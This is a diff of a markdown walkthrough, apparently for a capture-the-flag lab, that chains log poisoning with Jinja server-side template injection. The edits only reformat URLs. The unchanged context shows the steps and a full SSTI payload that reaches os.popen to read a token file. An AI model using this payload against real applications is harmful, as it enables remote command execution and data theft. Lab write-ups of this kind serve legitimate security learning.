@@ -19,7 +19,7 @@ This is log poisoning and Jinja SSTI
 Register new user
 
 Go to search term and search for "user=admin"
-While on that search result page - change the URL to <http://10.102.122.21/raw/log.txt>
+While on that search result page - change the URL to  `http://10.102.122.21/raw/log.txt`
 
 You should be able to view the raw log file now
 
@@ -29,7 +29,8 @@ Go back to search and use the payload:
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /tmp/token.txt").read()}}{% endif %}{% endfor %}
 ```
 {% endraw %}
-Now search for user=admin again and go to <http://10.102.122.21/raw/log.txt>
+
+Now search for user=admin again and go to  `http://10.102.122.21/raw/log.txt`
 
 - And we get the token:
 
